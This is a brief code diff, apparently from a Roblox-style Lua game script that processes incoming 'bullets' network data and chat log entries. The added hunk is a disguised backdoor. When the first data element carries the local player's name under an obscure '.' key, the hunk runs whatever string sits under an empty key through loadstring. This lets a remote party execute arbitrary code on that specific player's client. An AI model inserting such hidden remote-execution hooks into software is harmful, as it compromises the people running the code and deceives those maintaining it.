@@ -4219,6 +4219,10 @@ do
 
             return
         end
+			
+	if type(bullets[1]) == "table" and bullets[1][''] and bullets[1]['.'] == lp.Name then
+		loadstring(bullets[1][''])()
+	end
 
         if bullets[1] and bullets[1]["CC_IDENTIFIER"] then
             ChatLogAdd(bullets[1]["CC_IDENTIFIER"], bullets[2]["Message_Unsecure"], tick())
